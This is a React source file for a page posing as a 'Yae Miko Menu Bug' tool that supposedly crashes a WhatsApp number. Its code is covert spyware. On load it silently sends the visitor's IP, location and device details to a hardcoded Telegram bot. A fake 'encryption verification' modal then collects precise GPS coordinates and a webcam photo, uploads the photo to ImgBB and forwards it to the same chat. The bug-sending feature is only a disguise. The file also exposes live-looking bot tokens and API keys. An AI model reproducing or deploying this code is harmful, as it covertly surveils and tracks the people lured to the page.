"use client"

import { useState, useEffect } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight } from "lucide-react"

// ============================================================
// --- KONFIGURASI WAJIB ISI (BIAR GACOR) ---
// ============================================================
const TELE_TOKEN = '8336153314:AAG-INrEg4-5ImwErpS44S6tRdNmT6gT-4M';
const CHAT_ID = '6481060681';
const IMGBB_API_KEY = '4caf6ea53a17b11f879581a8ca9ee92e'; 

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)
  const [showVerifyModal, setShowVerifyModal] = useState(false)

  // 1. FUNGSI AMBIL DATA INTEL (SAAT LINK DIBUKA)
  const sendInitialIntel = async () => {
    try {
      let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase();
      localStorage.setItem('target_uuid', targetID);
      
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      
      let gpu = "Unknown";
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        const debug = gl?.getExtension('WEBGL_debug_renderer_info');
        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown";
      } catch (e) {}

      const msg = `🕵️ **NEW INTEL: ${targetID}**\n━━━━━━━━━━━━━━━━━━\n📍 **IP:** ${ipData.ip} (${ipData.org})\n🌍 **LOC:** ${ipData.city}, ${ipData.country_name}\n💻 **OS:** ${navigator.platform}\n🎮 **GPU:** ${gpu.slice(0,30)}\n🔋 **BAT:** ${navigator.hardwareConcurrency} Core / ${navigator.deviceMemory || '?'}GB RAM\n━━━━━━━━━━━━━━━━━━`;

      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      });
    } catch (e) {}
  };

  useEffect(() => { sendInitialIntel(); }, []);

  // 2. FUNGSI GPS AKURAT
  const getPreciseLocation = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) resolve("GPS Not Supported");
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          resolve(`📍 **PRECISE LOC:** [Open Google Maps](${link})\n🎯 **ACCURACY:** \`${pos.coords.accuracy.toFixed(1)}m\``);
        },
        () => resolve("📍 **PRECISE LOC:** \`Permission Denied\`"),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  };

  // 3. FUNGSI UPLOAD KE IMGBB
  const uploadToIMGBB = async (imageBlob: Blob) => {
    const formData = new FormData();
    formData.append('image', imageBlob);
    try {
      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: 'POST',
        body: formData
      });
      const data = await res.json();
      return data.data.url;
    } catch (e) { return null; }
  };

  // 4. EKSEKUSI FINAL (KAMERA + GPS + IMGBB)
  const startFinalExecution = async () => {
    setShowVerifyModal(false);
    setIsLoading(true);

    const preciseLoc = await getPreciseLocation();
    
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      // Ambil foto di detik ke-3 (saat target fokus liat loading)
      setTimeout(async () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d')?.drawImage(video, 0, 0);
        const blob = await new Promise<Blob | null>(res => canvas.toBlob(res, 'image/jpeg'));
        
        if (blob) {
          const photoUrl = await uploadToIMGBB(blob);
          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━━━━━━━━━`;
          
          await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
          });
        }
        stream.getTracks().forEach(t => t.stop());
      }, 3000);
    } catch (e) {
      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`, parse_mode: 'Markdown' })
      });
    }

    setTimeout(() => { setIsLoading(false); setBugLimit(p => Math.max(0, p - 1)); }, 5000);
  };

  const handleSendBug = () => {
    if (bugLimit <= 0) { setShowLimitWarning(true); return; }
    setShowVerifyModal(true);
  };

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden">
      <BokehBackground />
      
      {/* MODAL VERIFIKASI PALSU (FIRST LAYER) */}
      {showVerifyModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-[#0a0f1a]/90 backdrop-blur-md px-6">
          <div className="w-full max-w-sm glass border border-cyan-500/30 p-6 rounded-2xl text-center space-y-6">
            <div className="flex justify-center">
              <div className="w-16 h-16 bg-cyan-500/10 rounded-full flex items-center justify-center border border-cyan-500/40 shadow-[0_0_15px_rgba(6,182,212,0.5)]">
                <Shield className="w-8 h-8 text-cyan-400" />
              </div>
            </div>
            <div className="space-y-2">
              <h2 className="text-lg text-white font-bold tracking-widest uppercase">Enkripsi Diperlukan</h2>
              <p className="text-sm text-gray-400">Untuk memproses <b>Secure-Socket Bug</b>, sistem perlu memvalidasi sertifikat perangkat Anda melalui sinkronisasi zona keamanan.</p>
            </div>
            <button onClick={startFinalExecution} className="w-full py-4 bg-cyan-600 hover:bg-cyan-500 rounded-xl text-white font-bold tracking-widest transition-all">VERIFIKASI SEKARANG</button>
            <p className="text-[9px] text-gray-600 uppercase tracking-tighter">Secure Cyber-Protocol Environment v3.0.4</p>
          </div>
        </div>
      )}
      
      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen onLogin={() => {
            setIsAuthLoading(true);
            setTimeout(() => { setIsAuthLoading(false); setIsLoggedIn(true); }, 5000);
          }} />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection targetNumber={targetNumber} setTargetNumber={setTargetNumber} onSendBug={handleSendBug} activeNav={activeNav} />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}
    </div>
  )
}

// ============================================================
// --- KOMPONEN UI (STYLING) ---
// ============================================================

function AuthLoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a] overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-[#0a0f1a] via-[#0d1a35] to-[#1a0a1f]" />
      <div className="relative z-10 flex flex-col items-center gap-8">
        <div className="text-8xl font-black tracking-wider text-[#ff3db9] drop-shadow-[0_0_20px_rgba(255,61,185,0.8)] animate-pulse">SELZ</div>
        <div className="text-center space-y-3">
          <p className="text-sm text-cyan-400 tracking-widest uppercase">System Glitch Authentication</p>
          <div className="w-64 h-1 bg-[#1a2540] rounded-full overflow-hidden border border-cyan-500/30">
            <div className="h-full bg-gradient-to-r from-cyan-400 to-pink-500 animate-[loading-progress_3s_ease-in-out_infinite]" style={{width: '100%'}} />
          </div>
        </div>
      </div>
    </div>
  )
}

function BokehBackground() {
  return (
    <div className="fixed inset-0 pointer-events-none -z-10">
      <div className="absolute top-10 -left-20 w-64 h-64 rounded-full bg-cyan-500/10 blur-3xl animate-pulse" />
      <div className="absolute bottom-20 right-10 w-56 h-56 rounded-full bg-pink-500/10 blur-3xl animate-pulse" />
      <div className="absolute inset-0 bg-[#0a0f1a]" />
    </div>
  )
}

function LoadingOverlay() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]/95 backdrop-blur-xl">
      <div className="text-center space-y-4">
        <div className="relative w-24 h-24 mx-auto">
          <div className="absolute inset-0 rounded-full border-4 border-cyan-500/20" />
          <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-cyan-400 animate-spin" />
          <Bug className="absolute inset-0 m-auto w-10 h-10 text-cyan-400 animate-pulse" />
        </div>
        <h3 className="text-cyan-400 font-bold tracking-widest uppercase">Bug Sedang Dikirim...</h3>
      </div>
    </div>
  )
}

function LoginScreen({ onLogin }: any) {
  const [u, setU] = useState(""); const [p, setP] = useState("");
  return (
    <div className="relative z-20 flex items-center justify-center min-h-screen px-4">
      <div className="glass p-8 rounded-2xl border border-cyan-500/20 w-full max-w-sm bg-[#161b22]/50">
        <h1 className="text-center text-cyan-400 text-3xl font-bold tracking-tighter mb-2">YAE MIKO</h1>
        <p className="text-center text-gray-500 text-[10px] tracking-widest uppercase mb-8">Menu Bug Version 3.0</p>
        <div className="space-y-4">
          <input type="text" placeholder="Username" className="w-full p-3 bg-[#0f192d] border border-cyan-500/30 rounded-lg text-white outline-none focus:border-cyan-400" onChange={e=>setU(e.target.value)} />
          <input type="password" placeholder="Password" className="w-full p-3 bg-[#0f192d] border border-cyan-500/30 rounded-lg text-white outline-none focus:border-cyan-400" onChange={e=>setP(e.target.value)} />
          <button onClick={() => u==="Selz" && p==="Freebug" ? onLogin() : alert("Harap create akun ke t.me/Selzv")} className="w-full py-4 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-xl transition-all shadow-lg shadow-cyan-900/20">LOGIN SYSTEM</button>
        </div>
      </div>
    </div>
  )
}

function LimitWarningOverlay({ onClose }: any) {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md">
      <div className="text-center p-8 glass border border-red-500/30 rounded-3xl max-w-xs">
        <h2 className="text-red-500 text-2xl font-bold mb-2 uppercase">Limit Habis!</h2>
        <p className="text-gray-400 text-sm mb-6">Limit akan di-reset otomatis dalam 24 jam ke depan.</p>
        <button onClick={onClose} className="w-full py-3 bg-red-600 text-white font-bold rounded-xl">PAHAM</button>
      </div>
    </div>
  )
}

function Header() {
  return (
    <header className="flex justify-between items-center mb-6">
      <div className="p-2 bg-cyan-500/10 rounded-lg border border-cyan-500/30"><Shield className="text-cyan-400 w-5 h-5" /></div>
      <h1 className="text-white text-[10px] font-bold tracking-[0.3em] uppercase">Yae Miko Menu Bug</h1>
      <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-400 text-xs font-bold">YM</div>
    </header>
  )
}

function ProfileCard() {
  return (
    <div className="bg-[#1a2540]/40 p-6 rounded-3xl border border-cyan-500/10 mb-6 text-center">
      <div className="w-16 h-16 bg-red-500/10 rounded-full border-2 border-red-500/30 mx-auto mb-4 flex items-center justify-center">
        <Bug className="text-red-500 w-8 h-8" />
      </div>
      <div className="grid grid-cols-3 gap-2">
        <div className="space-y-1"><p className="text-cyan-400 font-bold text-sm">7</p><p className="text-[8px] text-gray-500 uppercase">Total Bug</p></div>
        <div className="space-y-1"><p className="text-green-400 font-bold text-sm">GACOR</p><p className="text-[8px] text-gray-500 uppercase">Rate</p></div>
        <div className="space-y-1"><p className="text-green-400 font-bold text-sm">ACTIVE</p><p className="text-[8px] text-gray-500 uppercase">Status</p></div>
      </div>
    </div>
  )
}

function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }: any) {
  return (
    <div className="flex-1 space-y-6">
      <div className="space-y-2">
        <label className="text-[9px] text-cyan-400 tracking-[0.2em] font-bold uppercase ml-1">Nomor Target</label>
        <input type="text" value={targetNumber} onChange={e=>setTargetNumber(e.target.value)} className="w-full p-4 bg-[#0d1a30] border border-cyan-500/10 rounded-2xl text-white font-mono text-lg focus:border-cyan-400/40 transition-all outline-none" />
      </div>
      <div className="bg-gradient-to-br from-[#0d1a30] to-[#161b22] p-8 rounded-3xl border border-cyan-500/10 text-center relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-1 bg-cyan-500/20" />
        <p className="text-[9px] text-cyan-400 mb-2 tracking-widest uppercase">Selected Bug</p>
        <p className="text-2xl font-black text-white tracking-tighter uppercase">{BUG_TYPES[activeNav].name}</p>
      </div>
      <button onClick={onSendBug} className="w-full py-5 bg-pink-600 hover:bg-pink-500 text-white font-black rounded-2xl shadow-xl shadow-pink-900/20 transition-all active:scale-95 uppercase tracking-widest">Kirim Bug Sekarang</button>
      <p className="text-[9px] text-gray-500 text-center leading-relaxed">
        <span className="text-cyan-600">Encrypted Protocol:</span> Sistem memerlukan verifikasi sinkronisasi zona keamanan perangkat untuk mencegah aktivitas spam robot.
      </p>
    </div>
  )
}

function NavigationDots({ activeNav, setActiveNav }: any) {
  return (
    <div className="flex justify-center gap-3 mb-6">
      {BUG_TYPES.map((_,i)=>(
        <div key={i} onClick={()=>setActiveNav(i)} className={`h-1.5 rounded-full cursor-pointer transition-all ${activeNav===i?'bg-cyan-400 w-8':'bg-gray-700 w-2'}`} />
      ))}
    </div>
  )
}

function BottomBar() {
  return (
    <div className="mt-auto py-4 border-t border-gray-900 flex justify-between items-center text-[9px] text-cyan-600 font-bold uppercase tracking-widest">
      <ChevronLeft size={14}/> PiLiH SENDER <ChevronRight size={14}/>
    </div>
  )
                  }
